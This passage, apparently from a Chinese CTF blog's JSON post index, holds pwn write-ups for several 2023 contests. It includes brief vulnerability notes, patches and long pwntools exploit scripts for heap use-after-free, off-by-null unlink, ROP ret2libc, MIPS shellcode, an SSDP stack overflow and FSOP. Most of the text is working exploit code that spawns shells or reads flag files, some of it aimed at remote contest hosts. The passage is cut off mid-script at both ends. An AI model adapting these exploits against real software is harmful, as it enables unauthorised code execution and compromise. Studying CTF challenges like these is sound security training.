:io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './cgi'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''brva 0x0000001C8Dcontinue'''.format(**locals())io = start(binary)rn = b'\\r\\n'def add(idx,name,pwd,size):    data  = b'PUT /profile?' + (b'id=%d' % idx) + rn    data += b' ' + rn    data += b'Content-Type: application/x-www-form-urlencoded' + rn * 2    data += (b'name=%s' % name) + (b'&amp;password=%s' % pwd) + (b'&amp;password_length=%d' % size) + rn    s(data)def edit(idx,name,pwd):    data  = b'POST /profile?' + (b'id=%d' % idx) + rn    data += b' ' + rn    data += b'Content-Type: application/x-www-form-urlencoded' + rn * 2    data += (b'name=%s' % name) + (b'&amp;password=%s' % pwd) + rn    s(data)def show(idx):    data  = b'GET /profile?' + (b'id=%d' % idx) + rn    data += b' ' + rn    data += b'Content-Type: application/x-www-form-urlencoded' + rn * 2    s(data)def rm(idx):    data  = b'DELETE /profile?' + (b'id=%d' % idx) + rn    data += b' ' + rn    data += b'Content-Type: application/x-www-form-urlencoded' + rn * 2    s(data)add(0,b'name1',b'mepwd1',0x440)add(1,b'name2',b'mepwd2',0x440)ru('HTTP')rm(0)ru('HTTP')show(0)ru('ord=')x = uu64(r(6))libc_base = x - 2018272libc = elf.libc__free_hook = libc_base + libc.sym['__free_hook']system =    libc_base + libc.sym['system']lss('x')lss('libc_base')rm(1)edit(1,p64(__free_hook)[:-2],b'456')add(2,b'/bin/sh',b'/bin/sh',0x440)add(3,p64(system)[:-2],b'mepwd2',0x440)rm(2)io.interactive()‍Fix  漏洞在 DELETE /profile​  free​ 后没有清除堆块指针，导致free 后的堆块 仍然可以被操作，      只需要free 后， 然后再把 bss 段上的指针清空即可    原始程序汇编​​​​‍  加固后​​​​‍lea r15, qword ptr[0x7060]mov r14, [rdx+r15]mov rdi,[r14+0x28]call _freemov rdi, [r15]call _freexor r14,14mov [r15],r14​​‍‍vuln  覆盖种子，栈溢出‍breakfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './vuln'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()from ctypes import *import timedll = CDLL('/usr/lib/x86_64-linux-gnu/libc.so.6')ru('Please enter your name:\\n')#gdb.attach(io)s(18*'A')dll.srand(0x41414141)for i in range(100):    x = dll.rand() % 100 + 1    ru('Guess the random number:\\n')    sl(p32(x))ru(\"You are talented, here's your gift!\\n\")pay = 0x38 * b'A' + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x0401261)sl(pay)x = uu64(r(6))libc = elf.libclibc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))ls(hex(libc_base))pay = 0x38 * b'A' + p64(rop.find_gadget(['ret'])[0])*1 + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(bin_sh) + p64(system) + p64(elf.sym['main'])sl(pay)io.interactive()‍Fix‍  控制 read 的大小即可"
  },
  
  {
    "title": "第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec",
    "url": "/posts/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B-%E5%AE%9E%E8%B7%B5%E8%B5%9B-AWDP-Pwn-WriteUps_by_AhiSec/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-12-17 20:00:00 +0800",
    





    
    "snippet": "‍‍2023-12-17-第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec‍‍pwn-easygo‍程序分析‍      存在一个后门        输入溢出覆盖栈上数据        没什么好玩的  ‍Break‍  溢出直接覆盖就行了，‍from pwn import *s       = lambda data            ...",
    "content": "‍‍2023-12-17-第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec‍‍pwn-easygo‍程序分析‍      存在一个后门        输入溢出覆盖栈上数据        没什么好玩的  ‍Break‍  溢出直接覆盖就行了，‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x049B4C4b *0x049B5D6continue'''.format(**locals())binary = './eazygo'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('8.147.135.51',23882)ru(':')sl(p64(0xFFFFFFFFFFFFFFF6)*2)ru(':')#sl(b'A'*(14*8)+p64(0)+p64(0x049B5E0)*15)sl(p64(0xFFFFFFFFFFFFFFF6)*14+p64(0)+p64(0x049B5E0)*15) # 实际没这么复杂# 为什么加 p64(0) 调试你就知道了io.interactive()‍Fixpatch 后门函数‍​​‍​​‍‍phone_book‍程序分析‍      比赛时没有 Break ，赛后看看        漏洞点比较刁钻，赛后看了一天才找到漏洞，我是fw  ‍​​‍‍  这么讲吧  size  = 输入的总长度 0x40 #可修改size  strdup(strlen(input_str)) # 如果 我们输入的 都是 NUll 字节strlen得到的是 0 , strdup 只会 申请 到 0x21 的chunk  但是add 后面提供了 改 ， 大概这个范围 input_str[size] size 是 0x40 但是 申请到的堆块只有 0x21 所以我们可以 修改 这个堆块下的数据，如 size fd bk ，但是只能改成 “0123456789” 这些  ‍​​‍​​‍​​‍  修改 tcachebins 链表‍​​‍​​Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x0001606brva 0x000142Bcontinue'''.format(**locals())binary = './pwn.bak'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()def add(idx,num,name,y='n',i='0',c='2'):    ru('&gt;&gt;')    sl('1')    ru(\"idx:\")    sl(str(idx))    ru('Please Input Phone Number: ')    sl(num)    ru('Do you need to change phone Number? (y/n): ')    if(y=='y'):        sl('y')        ru('which number is wrong?')        sl(i)        ru('please input right char:')        sl(c)    else:        sl('n')    ru('please input name: ')    sl(name)def show(idx):    ru('&gt;&gt;')    sl('2')    ru('card idx:')    sl(str(idx))    ru('phone: ')def rm(idx):    ru('&gt;&gt;')    sl('3')    sl(str(idx))add(0,'\\x00'*0x500,'A'*0x40)add(1,'\\x00' * 0x40,'N'*0x10,'y',f'{0}','1')show(1)x = uu64(r(6)) &gt;&gt; 8 &lt;&lt; 8libc_base = x - 2018048lss('libc_base')libc = elf.libc__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']add(2,'\\x00',p64(__free_hook))add(3,'\\x00','name2')add(4,'\\x00','name3')rm(4)rm(3)## fsadd(5,'\\x00' * 0x40,'/bin/sh;','y',f'{0x20}','0')add(0,'\\x00',p64(system))gdb.attach(io,'brva 0x01813')rm(5)io.interactive()‍​​‍‍Fix‍比赛是 这样fix 的 改指针，呵呵呵，防御成功,学长教的‍​​‍‍​​‍‍  找到漏洞位置后，用新方法加固漏洞点‍​​‍​​‍先 nop 掉‍​​‍‍  然后加代码‍mov rcx, [rbp - 0x190]    ; 存储size 的指针 mov [rcx], rdx            ;strdup() 返回的 sizemov rcx, [rbp - 0x188]     ; 存储heap_ptr 的指针 mov [rcx], rax             ;strdup() 返回的 堆块指针‍​​‍  测试 没问题，bss 指针也没问题‍END‍‍  创新赛 8‍​​‍  实践赛  2‍​​‍‍‍​​‍‍‍‍​​"
  },
  
  {
    "title": "2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups",
    "url": "/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-11-25 20:00:00 +0800",
    





    
    "snippet": "‍‍DASCTF X CBCTF 2023｜无畏者先行‍‍Pwn-ASadStory‍  保护​​  沙箱​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), dat...",
    "content": "‍‍DASCTF X CBCTF 2023｜无畏者先行‍‍Pwn-ASadStory‍  保护​​  沙箱​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = '../challenge'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('node4.buuoj.cn',27797)ru('1.yes / 2.no\\n')ru(': ')sl('1')ru('your choice: ')sl('1')ru('initial函数的地址:')x = int(r(14),16)elf_base = x - 4681elf.address = elf_base#bss = elf.bss()bss = elf_base + 0x4000lss('x')lss('elf_base')lss('bss')magic = elf_base + 0x0000000000001232 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; retrdi   = elf_base + 0x0000000000001643 # pop rdi ; retrsi   = elf_base + 0x0000000000001641 # pop rsi ; pop r15 ; retread_plt = elf.plt['read']read_got = elf.got['read']csu1 = elf_base + 0x0163Acsu2 = elf_base + 0x01620lret = elf_base + 0x015CF#gdb.attach(io,'brva 0x000147B')# 00147B#gdb.attach(io,'brva 0x001632')sl('2')pause()pay  = b'A' * 0x38pay += p64(csu1)pay += p64(0) # rbxpay += p64(1) # rbppay += p64(0) # r12 rdipay += p64(bss+0x200) # r13 rsipay += p64(0x200) # r14 rdxpay += p64(elf.got['read']) # r15 call_addrpay += p64(csu2)pay += p64(0x41)pay += p64(bss+0x200-8) * 6pay += p64(lret) # leave retsl(pay)pause()#libc = elf.libclibc = ELF('./libc-2.31.so')mprotect    = libc.sym['mprotect']read_offset = libc.sym['read']offset = (mprotect - read_offset)target = elf.got['read']pay  = p64(csu1)pay += p64(offset) # rbxpay += p64(target+0x3d) # rbppay += p64(0) * 4pay += p64(magic)pay += p64(csu1)pay += p64(0) # rbxpay += p64(1) # rbppay += p64(bss) # r12 # rdipay += p64(0x1000) # rsipay += p64(0x7) # rdxpay += p64(bss+0x200+0x80) # retpay += p64(csu2)pay += p64(lret+1) * 7pay += p64(rdi)pay += p64(bss)pay += p64(elf.plt['read'])pay += p64(bss+0x200+len(pay)+0x8)pay += b'\\x90' * 0x10#pay += asm(shellcraft.open('flag'))#pay += asm(shellcraft.sendfile(1,'rax',0,0x50))#pay += asm(shellcraft.sh())pay += asm(shellcraft.openat(-1, '/flag'))pay += asm(shellcraft.sendfile(2,'rax',0,0x50))sl(pay)io.interactive()‍‍Pwn-garbage‍​​‍‍  off by null‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './challenge'if (binary!=''): elf  = ELF(binary)libc = elf.libcio = start(binary)#io = remote('node4.buuoj.cn',25983)def add(idx,size=0x4f8,text='A'):    ru('your choice: ')    sl('1')    ru('pls input the idx of garbage: ')    sl(str(idx))    ru('pls input the size of garbage: ')    sl(str(size))    ru('pls input the content of garbage: ')    s(text)def rm(idx):    ru('your choice: ')    sl('2')    ru('pls input the idx of garbage: ')    sl(str(idx))def show(idx):    ru('your choice: ')    sl('3')    ru('pls input the idx of garbage: ')    sl(str(idx))    ru('Content: ')def edit(idx,text):    ru('your choice: ')    sl('4')    ru('pls input the idx of garbage: ')    sl(str(idx))    ru('pls input the new content of garbage:')    s(text)add(0)add(1)add(2)add(3)add(4)note = 0x0404060fd = note - 0x18bk = note - 0x10pay = p64(0) + p64(0x4f1)pay += p64(fd) + p64(bk)pay = pay.ljust(0x4f0,b'\\x00')pay += p64(0x4f0)edit(0,pay)rm(1)pay = p64(0) * 3pay += p64(fd)pay += p64(0)pay += p64(0x403FB8)pay += b'\\n'edit(0,pay)show(2)libc_base = uu64(r(6)) - libc.sym['puts']lss('libc_base')libc = elf.libclibc.address = libc_baseenv =  libc.sym['environ']system = libc.sym['system']libc_rop = ROP(libc)rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]bin_sh = next(libc.search(b'/bin/sh'))pay  = p64(0) * 3pay += p64(fd)pay += p64(0)pay += p64(env)#pay += p64(fio+)pay += b'\\n'edit(0,pay)show(2)stack = uu64(r(6))lss('stack')ret= stack - 352#gdb.attach(io,'b *0x004017E5')pay  = p64(0) * 3pay += p64(ret) + b'\\n'edit(0,pay)#fake_IO = 0x404100pay = p64(rdi+1) + p64(rdi) + p64(bin_sh) + p64(system) + b'\\n'edit(0,pay)## house of apple2  直接 puts 刷新IO 可以控制 栈有问题## puts IO #fake_IO_FILE += p64(libc_base + ogg[3])#fake_IO_FILE  = p64(0) * 2#fake_IO_FILE += p64(setcontext + 61)#fake_IO_FILE += p64(0) * 14#fake_IO_FILE += p64(fake_IO_addr+0x100)#fake_IO_FILE += p64(0) * 2#fake_IO_FILE += p64(fake_IO_addr)#fake_IO_FILE += p64(0) * 6#fake_IO_FILE += p64(_IO_wfile_jumps + 0x20-0x40)#fake_IO_FILE += p64(fake_IO_addr-0x68+0x10)#edit(2,fake_IO_FILE+b'\\n')#print(_IO_wfile_jumps)#edit(0,p64(fio)+b'\\n')#edit(2,fake_IO_FILE)#add(0x400,fake_IO_FILE)io.interactive()‍Pwn-shaopi‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'mips'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())#io = process(['qemu-mipsel', '-g', '1000', '-L', '.' ,'./challenge'])#io = process(['qemu-mipsel', '-g', '1234', '-L', '.' ,'./pwn'])#io = process(['qemu-mipsel-static','./challenge'])#io = process(['qemu-mipsel','./challenge'])io = remote('node4.buuoj.cn',26794)ru('your passphrase: ')sl(bytes.fromhex('e4b889e58583e4b880e4b8b2e58d81e58583e4b889e4b8b2'))ru('Congratulation!\\n')pause()#pay = 0x44 * b'A' +p32(0x0043965C) + shellcode# 0x439670    lw     $a0, 0x3c($sp)# 0x439674    sw     $v0, 0x1c($sp)# 0x439678    sw     $zero, 0x18($sp)# 0x43967c    sw     $zero, 0x10($sp)# 0x439680    lw     $v0, 0x34($sp)# ► 0x439684    jalr   $t9                           &lt;0x41414141&gt;pay = cyclic(0x40) + p32(0x00431084) +p32(0x0043965C) + 88*b'\\x00' + asm(shellcraft.read(0,'$a2',0x200))sl(pay)pause()# 溢出数据有限 所以选择 二次 read shellcodepay = asm(shellcraft.sh())sl(b'\\x00'*0x20 + pay)io.interactive()‍0x0043965C 用来调整寄存器数据Contorl Jump 是 执行完gadget 后的跳转， 我选择的gatget   最后的 是 jalr $fp​ ，$fp​ 有就是栈 是我们可控的‍​​‍0x00431084 $fp 返回地址‍调整后 $a2​ 指向的地址也就是 shellcode in stack 的 addr 直接跳过去‍​​‍​‍‍‍Pwn-fakeSSDP‍我是菜鸡，跟着wp做的‍‍⁣﻿⁢﻿⁣⁤‬⁡‍‬⁢⁣⁤‌⁡⁢⁤‌⁡⁡﻿‍⁣⁣‬‬‌﻿⁣﻿‬‬⁢⁡‌‌‌‍DAS X 0psu3 - 飞书云文档 (feishu.cn)‍‍还不知道 SSDP 是啥，我就抓个包看看‍​​‍‍‍‍pay  = b'M-SEARCH * HTTP/1.1\\r\\n'pay += b'HOST: 239.255.255.250:1900\\r\\n'pay += b'MAN: \"ssdp:discover\"\\r\\n'pay += b'MX: 1\\r\\n'pay += b'ST: urn:dial-multiscreen-org:service:dial:1\\r\\n'pay += b'USER-AGENT: Microsoft Edge/119.0.2151.93 Windows\\r\\n'‍‍​​‍‍  目测 system函数‍​​​​‍有 sandbox函数，导致貌似不能利用命令拼接‍‍​​‍​​​​​​‍gdb.attach(io,'b *0x0403591')ru('Waiting for SSDP request')from base64 import b64encodep = 300 * b'B'pay  = b'M-SEARCH * HTTP/1.1\\r\\n'pay += b'HOST: 239.255.255.250:1900\\r\\n'pay += b'MAN: \"ssdp:discover\"\\r\\n'pay += b'MX: 3\\r\\n'pay += b'ST: ssdp:all '+p+b'\\r\\n' // 主要处理点pay += b'USER-AGENT: Microsoft Edge/119.0.2151.93 Windows\\r\\n'sl(b64encode(pay))io.interactive()‍There is a stack overflow vulnerability​​‍rsi in the value in our ST, overwrite return address as “call rsi”‍​​‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './fakeSSDP'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('node4.buuoj.cn',27898)ru('name')sl('text')#gdb.attach(io,'b *0x0403591')ru('Waiting for SSDP request')from base64 import b64encodersi = 0x000000000045fe1e # call rsip  = asm(shellcraft.sh())p += b'ssdp:all'p  = p.ljust(0xe8,b'A')p += p64(rsi)pay  = b'M-SEARCH * HTTP/1.1\\r\\n'pay += b'HOST: 239.255.255.250:1900\\r\\n'pay += b'MAN: \"ssdp:discover\"\\r\\n'pay += b'MX: 3\\r\\n'pay += b'ST: '+p+b'\\r\\n'pay += b'USER-AGENT: Microsoft Edge/119.0.2151.93 Windows\\r\\n'sl(b64encode(pay))io.interactive()‍‍‍‍找到漏洞点后就非常好搞了，静态分析起来确实有点困难‍​​‍  存一下‍ssdp_all = b'M-SEARCH * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'MAN: \"ssdp:discover\"\\r\\n' \\    + b'MX: 3\\r\\n' \\    + b'ST: ssdp:all\\r\\n' \\    + b'USER-AGENT: Google Chrome/87.0.4280.88 Windows\\r\\n\\r\\n'ssdp_uuid = b'M-SEARCH * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'MAN: \"ssdp:discover\"\\r\\n' \\    + b'MX: 3\\r\\n' \\    + b'ST: uuid:1\\r\\n' \\    + b'USER-AGENT: Google Chrome/87.0.4280.88 Windows\\r\\n\\r\\n'ssdp_root = b'M-SEARCH * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'MAN: \"ssdp:discover\"\\r\\n' \\    + b'MX: 3\\r\\n' \\    + b'ST: upnp:rootdevice\\r\\n' \\    + b'USER-AGENT: Google Chrome/87.0.4280.88 Windows\\r\\n\\r\\n'notify_alive = b'NOTIFY * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'CACHE-CONTROL: max-age = seconds until advertisement expires\\r\\n' \\    + b'LOCATION: 3\\r\\n' \\    + b'USN: 1\\r\\n' \\    + b'NTS: ssdp:alive\\r\\n' \\    + b'NT: upnp:rootdevice\\r\\n\\r\\n'notify_bye = b'NOTIFY * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'CACHE-CONTROL: max-age = seconds until advertisement expires\\r\\n' \\    + b'LOCATION: 3\\r\\n' \\    + b'USN: 1\\r\\n' \\    + b'NTS: ssdp:byebye\\r\\n' \\    + b'NT: upnp:rootdevice\\r\\n\\r\\n'notify_bye_inject = b'NOTIFY * HTTP/1.1\\r\\n' \\    + b'HOST: 239.255.255.250:1900\\r\\n' \\    + b'CACHE-CONTROL: max-age = seconds until advertisement expires\\r\\n' \\    + b'LOCATION: 3\\r\\n' \\    + b'USN: \\'/bin/sh\\'\\r\\n' \\    + b'NTS: ssdp:byebye\\r\\n' \\    + b'NT: upnp:rootdevice\\r\\n\\r\\n'"
  },
  
  {
    "title": "2023香山杯决赛Pwn-分析",
    "url": "/posts/2023%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BPwn-%E5%88%86%E6%9E%90/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-11-20 20:00:00 +0800",
    





    
    "snippet": "  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。camera‍程序分析‍​​‍根据程序的功能然后加上一些手法，可以double free后面就是填满 tcachebins 然后 fastbin double free 就好了‍​​‍‍cat 用的顺手了，我就直接用 cat  ORW 就好了​​‍Break‍from pwn import *s    ...",
    "content": "  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。camera‍程序分析‍​​‍根据程序的功能然后加上一些手法，可以double free后面就是填满 tcachebins 然后 fastbin double free 就好了‍​​‍‍cat 用的顺手了，我就直接用 cat  ORW 就好了​​‍Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './dalao_slo/pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)libc = elf.libcio = start(binary)#io = remote()def rm(size):    ru('&gt;&gt; \\n')    sl('1')    sl(str(size))def add(size,text):    ru('&gt;&gt; \\n')    sl('2')    ru('Please select a film of your preference within your budget.\\n')    sl(str(size))    ru('Content: \\n')    sl(text)def load(idx):    ru('&gt;&gt; \\n')    sl('3')    ru('whitch one do you want to load\\n')    sl(str(idx))add(0x488,'text0')add(0x60,'text1')load(0)rm(1)add(0x488,'')load(0)rm(1)ru('content: ')main_arena = uu64(r(6))libc_base = main_arena - 2018272add(0x488,'pad')for i in range(8):    add(0x60,f'text{i}')for i in range(8+1,1,-1):    load(i)rm(8)for i in range(7):    add(0x60,f'')#load(8)load(7)rm(3)ru('content: ')xx = uu64(r(6))heap_base = xx - 1952libc.address = libc_base_IO_list_all    = libc.sym['_IO_list_all']add(0x60,p64(_IO_list_all-0x20))add(0x60,'/bin/sh\\x00')add(0x60,'/bin/sh\\x00')add(0x60,'/bin/sh\\x00')pay = p64(0)*2 + p64(heap_base + 2832)add(0x60,pay)libc.address = libc_baselibc_rop = ROP(libc)system          = libc.sym['system']mprotect        = libc.sym['mprotect']setcontext      = libc.sym['setcontext']__free_hook     = libc.sym['__free_hook']_IO_list_all    = libc.sym['_IO_list_all']_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']rax = libc_rop.find_gadget(['pop rax','ret'])[0]rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]rdx = libc_rop.find_gadget(['pop rdx','pop rbx','ret'])[0]RCE = setcontext + 61fake_IO_addr = heap_base + 2832shellcode_addr = fake_IO_addr + 